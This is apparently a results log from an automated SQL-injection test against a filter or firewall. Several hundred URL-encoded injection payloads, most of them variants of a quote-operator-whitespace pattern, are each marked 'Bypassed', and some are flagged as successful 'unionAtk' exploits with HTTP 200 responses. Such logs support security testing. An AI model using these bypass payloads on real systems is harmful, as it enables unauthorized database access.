Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.017,72.12,No,200
0%27or%0b@<@+or,Bypassed,Yes,unionAtk,Unknown,0.0142,72.12,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0211,72.12,No,200
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0112,72.12,No,200
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0124,72.12,No,500
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0184,72.12,No,500
0%27<@!=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0153,72.12,No,200
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0199,72.12,No,500
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0124,72.12,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0188,72.12,No,500
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0231,72.12,No,500
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0152,72.12,No,500
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0144,72.12,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0133,72.12,No,500
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0139,72.12,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0147,72.12,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0095,72.12,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0176,72.12,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0172,72.12,No,500
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0102,72.12,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0213,72.12,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0116,72.12,No,200
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.015,72.12,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0189,72.12,No,200
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0167,72.12,No,500
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0142,72.12,No,500
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.013,72.12,No,500
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0124,72.12,No,200
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0127,72.12,No,500
0%27or+!@<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0312,72.12,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0103,72.12,No,200
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0214,72.12,No,500
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0105,72.12,No,500
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0158,72.12,No,200
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0197,72.12,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0135,72.12,No,200
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0243,72.12,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0102,72.12,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.016,72.12,No,200
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0168,72.12,No,500
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0189,72.12,No,500
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0238,72.12,No,500
0'or%0b@<@.%0b||,Bypassed,No,None,Unknown,0.017,72.12,No,500
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0222,72.12,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0251,72.12,No,200
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0164,72.12,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,72.12,No,200
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0113,72.12,No,500
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0255,72.12,No,200
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0177,72.12,No,500
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0168,72.12,No,500
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0221,72.12,No,500
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0198,72.12,No,500
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0185,72.12,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0115,72.12,No,500
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.011,72.12,No,200
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0273,72.12,No,200
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0094,72.12,No,500
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0138,72.12,No,200
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0179,72.12,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0118,72.13,No,500
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0154,72.15,No,500
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0164,72.15,No,500
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0217,72.15,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0098,72.15,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0118,72.15,No,500
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0189,72.15,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0189,72.15,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0311,72.15,No,500
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0232,72.15,No,200
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0136,72.15,No,500
0%27||+1<@.+||,Bypassed,Yes,unionAtk,Unknown,0.0159,72.15,No,200
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0211,72.15,No,500
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0131,72.15,No,500
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0145,72.15,No,200
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0185,72.15,No,500
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0229,72.15,No,500
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0142,72.15,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0165,72.15,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0115,72.15,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0097,72.15,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0076,72.15,No,200
5%0bor+{a,Bypassed,Yes,unionAtk,Unknown,0.0153,72.15,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0099,72.15,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0155,72.15,No,500
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0059,72.15,No,500
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.017,72.15,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0125,72.15,No,200
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.013,72.15,No,200
0'<@=1+||+,Bypassed,No,None,Unknown,0.0158,72.15,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0117,72.15,No,200
0'<@=.1%0b||+,Bypassed,No,None,Unknown,0.0105,72.12,No,500
0%27or%0b@<@.+||,Bypassed,Yes,unionAtk,Unknown,0.0162,72.12,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0115,72.12,No,200
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0129,72.12,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0093,72.12,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0207,72.12,No,200
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.009,72.12,No,200
0%27<@!=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0126,72.12,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0158,72.12,No,200
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0174,72.12,No,200
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0174,72.12,No,200
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0132,72.12,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0141,72.12,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0252,72.12,No,500
0'<@!=1.%0bor%0b,Bypassed,No,None,Unknown,0.0118,72.12,No,500
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0171,72.12,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0317,72.12,No,200
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0166,72.12,No,500
0'||%0b!@<@%0bor,Bypassed,No,None,Unknown,0.0183,72.12,No,500
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0101,72.13,No,500
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0104,72.15,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0128,72.15,No,500
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0153,72.15,No,200
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0063,72.15,No,200
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0171,72.15,No,500
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0147,72.15,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0212,72.15,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0195,72.15,No,500
0'or+@<@.%0bor,Bypassed,No,None,Unknown,0.016,72.15,No,500
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0151,72.15,No,500
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0207,72.15,No,500
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0206,72.15,No,500
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0141,72.15,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0213,72.15,No,200
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0152,72.15,No,500
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0238,72.15,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0176,72.15,No,200
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.0129,72.15,No,500
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0095,72.15,No,500
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0074,72.15,No,500
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0207,72.15,No,200
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0088,72.15,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0105,72.15,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0128,72.15,No,500
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0176,72.15,No,500
0'<@=.1%0b||+,Bypassed,No,None,Unknown,0.0076,72.15,No,500
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0164,72.15,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0152,72.15,No,500
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0094,72.15,No,500
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0167,72.15,No,500
0%27or+@<@.+||,Bypassed,Yes,unionAtk,Unknown,0.0158,72.12,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0153,72.12,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0156,72.12,No,200
0'<@!=1%0b||%0b,Bypassed,No,None,Unknown,0.0239,72.12,No,500
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0181,72.12,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0154,72.12,No,500
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0312,72.12,No,500
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0113,72.12,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0138,72.12,No,200
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0148,72.12,No,500
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.02,72.12,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.021,72.12,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0103,72.12,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.013,72.12,No,200
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0225,72.12,No,500
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0182,72.12,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0206,72.12,No,500
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0118,72.12,No,500
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0137,72.15,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.008,72.15,No,500
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0194,72.15,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0147,72.15,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0178,72.15,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0153,72.15,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0132,72.15,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0175,72.15,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0186,72.15,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0157,72.15,No,200
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0118,72.15,No,500
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0175,72.15,No,500
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0279,72.15,No,500
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0134,72.15,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0154,72.15,No,200
0'||%0b@<@.%0b||,Bypassed,No,None,Unknown,0.0155,72.15,No,500
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0179,72.15,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0232,72.15,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0128,72.15,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0122,72.15,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0134,72.15,No,200
0'<@!=1.%0bor%0b,Bypassed,No,None,Unknown,0.0089,72.15,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0133,72.15,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0131,72.15,No,500
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.012,72.15,No,200
0'<@!=1.%0bor%0b,Bypassed,No,None,Unknown,0.0096,72.15,No,500
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0139,72.15,No,200
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0164,72.15,No,500
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0151,72.15,No,500
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0117,72.15,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0151,72.15,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0135,72.15,No,500
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0136,72.12,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0116,72.12,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0188,72.12,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0122,72.12,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0112,72.12,No,200
0%27<@=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0124,72.12,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0154,72.12,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0216,72.12,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0138,72.12,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.01,72.12,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0112,72.12,No,500
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.017,72.12,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0178,72.12,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0137,72.12,No,500
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0151,72.12,No,200
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0218,72.12,No,200
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0132,72.12,No,500
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0182,72.12,No,500
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0076,72.12,No,500
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0255,72.15,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0145,72.15,No,200
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0183,72.15,No,200
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0125,72.15,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0215,72.15,No,200
5%27+or+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0156,72.15,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.014,72.15,No,500
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0228,72.15,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0169,72.15,No,500
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0176,72.15,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0229,72.15,No,200
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0136,72.15,No,500
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0164,72.15,No,500
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0176,72.15,No,500
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.041,72.15,No,200
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0134,72.15,No,500
0'||%0b!@<@%0bor,Bypassed,No,None,Unknown,0.0227,72.15,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0108,72.15,No,200
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0137,72.15,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0094,72.15,No,500
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0122,72.15,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0205,72.15,No,200
0%27or%0b1<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0119,72.15,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0188,72.15,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0114,72.15,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0152,72.15,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0099,72.15,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0084,72.15,No,200
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0137,72.15,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0117,72.15,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0181,72.15,No,200
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0184,72.12,No,500
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0123,72.12,No,500
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0175,72.12,No,500
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0181,72.12,No,200
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0213,72.12,No,500
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0127,72.12,No,500
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0154,72.12,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.017,72.12,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0143,72.12,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0128,72.12,No,500
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0082,72.12,No,500
0'<@!=1%0b||%0b,Bypassed,No,None,Unknown,0.0164,72.12,No,500
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0168,72.12,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0185,72.12,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0217,72.12,No,500
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0165,72.12,No,200
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.0206,72.12,No,500
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.022,72.13,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0147,72.15,No,200
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0163,72.15,No,200
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.012,72.15,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0217,72.15,No,500
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.016,72.15,No,200
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0203,72.15,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0124,72.15,No,200
0'<@=1%0b||+,Bypassed,No,None,Unknown,0.0141,72.15,No,500
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0098,72.15,No,500
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0086,72.15,No,200
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0154,72.15,No,500
0%27or%0b!@<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0226,72.15,No,200
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0183,72.15,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0185,72.15,No,200
0%27<@!=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0135,72.15,No,200
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0206,72.15,No,200
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0199,72.15,No,500
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.01,72.15,No,200
0'<@=1+||+,Bypassed,No,None,Unknown,0.0129,72.15,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0138,72.15,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0138,72.15,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0167,72.15,No,200
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0089,72.15,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0108,72.15,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0093,72.15,No,200
0'<@=1%0bor%0b,Bypassed,No,None,Unknown,0.019,72.15,No,500
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0112,72.15,No,500
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0102,72.15,No,200
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0142,72.15,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0117,72.15,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0205,72.15,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0132,72.15,No,200
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0217,72.12,No,500
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0165,72.12,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.023,72.12,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0123,72.12,No,200
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0155,72.12,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0141,72.12,No,200
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.014,72.12,No,500
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0126,72.12,No,500
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0121,72.12,No,200
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.01,72.12,No,500
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0219,72.12,No,500
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0127,72.12,No,200
0'<@=1%0bor%0b,Bypassed,No,None,Unknown,0.011,72.12,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0203,72.12,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0197,72.12,No,200
0%27or+!@<@.%0bor,Bypassed,Yes,unionAtk,Unknown,0.0133,72.12,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0205,72.12,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0179,72.12,No,500
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0266,72.13,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0166,72.15,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.014,72.15,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0147,72.15,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0156,72.15,No,200
